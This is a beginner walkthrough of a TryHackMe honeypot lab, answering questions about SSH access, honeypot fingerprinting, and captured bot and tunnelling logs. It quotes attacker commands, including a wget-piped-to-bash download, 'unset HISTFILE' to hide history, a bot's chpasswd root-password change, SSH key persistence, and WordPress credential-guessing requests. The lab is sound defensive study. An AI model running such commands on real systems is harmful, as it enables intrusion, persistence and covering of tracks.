# Introduction To Honeypots — TryHackMe

[![Target: TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge\&logo=tryhackme\&logoColor=white)](https://tryhackme.com)
[![OS: Linux](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge\&logo=linux\&logoColor=white)](#)
[![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](#)
[![Category: Honeypots](https://img.shields.io/badge/Category-Honeypots-purple?style=for-the-badge)](#)

---

## Overview

This repository contains a step-by-step walkthrough for the **Introduction To Honeypots** room on TryHackMe.

The room introduces the concept of **honeypots**, which are security mechanisms designed to attract and monitor potentially malicious activity. It provides a practical introduction to deploying a honeypot and interacting with the provided demo environment.

The walkthrough is written with beginners in mind. Rather than simply presenting commands, each section explains the steps involved in deploying and accessing the honeypot.

---

## TASK 1: Deploy the Honeypot

Deploy the machine and read the brief introduction explaining what a honeypot is.

Take note of the demo machine's IP address and add it to your local `/etc/hosts` file to allow access to the machine.

Example:

```bash
sudo nano /etc/hosts
````

 Then add:

```
MACHINE_IP    hostname
```
## TASK 2: Honeypot Interactivity and Classification

 Read about:

 - The different levels of **interactivity** of honeypots.
- The **classification** of honeypots.
- Where different types of honeypots are commonly deployed.

 The main idea is that honeypots can range from low-interaction systems, which simulate only limited services, to high-interaction systems that provide attackers with a much more realistic environment.
 
---
 ## TASK 3: Accessing the Honeypot

 We are provided with SSH login information:

 - **Username:** `root`
- **Password:** `anything`
- **IP:** The deployed machine IP

 Initially, a normal SSH connection may refuse the connection because of the host-key algorithm being used.

 For example:

```
ssh root@XXX.XXX.XXX.XXX
```

 If the server requires the older RSA host-key algorithm, use:

```
ssh -o HostKeyAlgorithms=+ssh-rsa root@XXX.XXX.XXX.XXX
```

 Then enter:

```
anything
```

 as the password.

 ### Q1: Try running some commands in the honeypot

 **Answer:** Yes

 After logging into the honeypot through SSH, I was able to run commands such as:

```
ls
mkdir
cat
ls -la
```

 The commands were accepted and executed by the honeypot.

 ### Q2: Create a file and then log back in. Is the file still there? (Yay/Nay)

 **Answer:** Nay

 I created a file using:

```
touch test.txt
```

 After exiting the SSH session, I logged back into the honeypot and checked for the file.

 The file was no longer present.

 Therefore, the expected answer is:

```
Nay
```
 ## TASK 4: Demo Account

 For this task, log into the honeypot using:

 - **Username:** `demo`
- **Password:** `demo`
- **Port:** `1400`

 The SSH connection can be made using the machine's IP address and port `1400`.

 Example:

```
ssh -p 1400 demo@MACHINE_IP
```
 # TASK 5: SSH Brute Force

 After logging in, use:

```
ls
```

 The directory contains:

```
BotCommands
Top200Creds.txt
Tunnelling
```

 ### Q1: How many passwords include the word "password" or some other variation of it, e.g. `p@ssw0rd`?

 First, view the credentials file:

```
head Top200Creds.txt
```

 I then searched the file for passwords containing the relevant pattern and counted the results:

```
cat Top200Creds.txt | grep "ps*.*ss.*" | wc -l
```

 The result was:

```
15
```


 ### Q2: What is arguably the most common tool for brute-forcing SSH?

 **Answer: Hydra**

 Hydra is a commonly used password-cracking/brute-force tool that supports SSH and many other network services.

 ### Q3: What intrusion prevention software framework is commonly used to mitigate SSH brute-force attacks?

 **Answer: Fail2Ban**

 Fail2Ban monitors logs for repeated authentication failures and can temporarily block offending IP addresses.

 # TASK 6: Honeypot Fingerprinting

 ### Q1: What's the full model name of the CPU the honeypot "uses"?

 **Answer: Intel(R) Core(TM) i9-11900KB CPU @ 3.30GHz**

 Using the root terminal, run:

```
cat /proc/cpuinfo
```

 Look for the `model name` field.

 The output identifies the CPU as:

```
Intel(R) Core(TM) i9-11900KB CPU @ 3.30GHz
```

 ### Q2: Does the honeypot return the correct values when `uname -a` is run? (Yay/Nay)

 **Answer: Nay**

 Running:

```
uname -a
```

 returns:

```
Linux acmeweb 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux
```

 However, this does not represent the actual underlying operating system.

 This can be compared with:

```
cat /etc/issue
```

 which returns:

```
Ubuntu 18.04.5 LTS \n \l
```

This discrepancy shows that the information returned by `uname -a` is being manipulated or spoofed by the honeypot.

### Q3: What flag must be set to pipe `wget` output into bash?

**Answer: `-O`**

The `-O` option can be used with `wget` to specify where the downloaded output should be written.

For example:

```
wget -O - http://example.com/script.sh | bash
```

### Q4: How would you disable bash history using `unset`?

**Answer: `unset HISTFILE`**

The command is:

```
unset HISTFILE
```

This removes the `HISTFILE` environment variable for the current shell, preventing Bash from writing the current session's commands to the usual history file.

# TASK 7: Bot Commands

 The `BotCommands` directory contains three samples:

```
Sample1.txt
Sample2.txt
Sample3.txt
```

## Q1: What brand of device is the bot in the first sample searching for?

**File:** `BotCommands/Sample1.txt`

**Answer: MikroTik**

The sample contains commands checking for files, device nodes, and services associated with GSM/SMS functionality on embedded networking equipment.

Important paths include:

```
/usr/bin/qmuxd
/var/qmux_connect_socket
/etc/config/simman
/dev/ttyGSM*
/dev/ttyUSB-mod*
/var/spool/sms/*
/var/config/sms/*
```

 These indicate that the bot is looking for a device with cellular modem/SIM/SMS functionality.

 This activity is associated with **MikroTik** networking equipment that supports cellular/LTE functionality.


---

 ## Q2: What are the commands in the second sample changing?

 **File:** `BotCommands/Sample2.txt`

 **Answer: Root password**

 The important command is:

```
echo "root:ZyTROnKtNOB5"|chpasswd|bash
```

 The command passes:

```
root:ZyTROnKtNOB5
```

 to `chpasswd`.

 This changes the password belonging to the `root` account.

---

 ## Q3: What is the name of the group that runs the botnet in the third sample?

 **File:** `BotCommands/Sample3.txt`

 **Answer: Outlaw**

 The strongest clue is the final command, which places an SSH public key into:

```
~/.ssh/authorized_keys
```

 The key contains the comment:

```
mdrfckr
```

 The `mdrfckr` identifier is associated with the **Outlaw** botnet/campaign.

 The preceding commands also perform system reconnaissance, including checking:

```
uname
top
free -m
crontab -l
cat /proc/cpuinfo
lscpu
```

These commands collect information about the victim's operating system, CPU, memory, processes, and scheduled tasks.

The reasoning can be summarized as:

```
mdrfckr SSH key
       ↓
Known botnet identifier
       ↓
Outlaw campaign
       ↓
Answer: Outlaw
```

# TASK 8: Tunnelling

The `Tunnelling` directory contains two samples:

```
Sample1.txt
Sample2.txt
```

## Q1: What application is being targeted in the first sample?
**File:** `Tunnelling/Sample1.txt`

**Answer: WordPress**

The most important part of the log is:

```
POST /xmlrpc.php HTTP/1.1
```

 `xmlrpc.php` is a WordPress XML-RPC endpoint.

 The request also contains:

```
<methodName>wp.getUsersBlogs</methodName>
```

 The `wp` prefix is associated with WordPress XML-RPC methods.

 The attacker is also supplying different usernames and passwords:

```
admin
password11
```

 and:

```
admin1
password1
```

 This indicates an attempt to authenticate using different credentials.

---

 ## Q2: Is the URL in the second sample malicious? (Yay/Nay)

 **File:** `Tunnelling/Sample2.txt`

 **Answer: Nay**

 The logs repeatedly show:

```
GET /json HTTP/1.1
Host: ip-api.com
```

 This corresponds to:

```
http://ip-api.com/json
```

 The endpoint is an IP-geolocation service.

 The requests are being used to obtain information about the public IP address of the machine, such as its approximate geographic/network information.

 There is no evidence in this particular log that `ip-api.com` itself is being exploited or attacked.

 The requests are also repeated at approximately five-minute intervals:

```
09:40
09:45
09:50
09:55
10:00
10:05
10:10
10:15
10:20
```

 This suggests automated activity, but the URL itself is not inherently malicious.

 # TASK 9

 No answer.


## Key Takeaways

This room demonstrates how honeypots can be used to observe and analyze attacker behavior.

Some of the important indicators encountered in the room include:

- **SSH brute-force activity**
- **Hydra**
- **Fail2Ban**
- **MikroTik device reconnaissance**
- **Root password modification**
- **Outlaw botnet activity**
- **SSH persistence through `authorized_keys`**
- **WordPress XML-RPC credential attacks**
- **IP-geolocation lookups through `ip-api.com`**
- **Honeypot fingerprinting and manipulated system information**

 The main lesson is that seemingly simple commands and network requests can provide useful clues about an attacker's objectives, tools, and malware.
